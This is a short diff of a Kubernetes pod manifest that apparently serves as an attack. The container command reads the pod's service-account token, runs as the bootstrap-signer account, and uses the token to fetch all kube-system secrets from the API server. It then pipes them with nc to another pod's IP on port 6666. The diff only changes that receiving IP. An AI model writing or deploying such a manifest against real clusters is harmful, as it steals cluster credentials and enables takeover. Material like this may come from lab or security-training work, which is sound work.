@@ -11,5 +11,5 @@ spec:
     args: ["-c", "apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token |
     { read TOKEN;
     curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\"
-    https:/${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/kube-system/secrets; } | nc 10.244.2.9 6666;"]
+    https:/${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/kube-system/secrets; } | nc 10.244.2.16 6666;"]
   serviceAccountName: bootstrap-signer
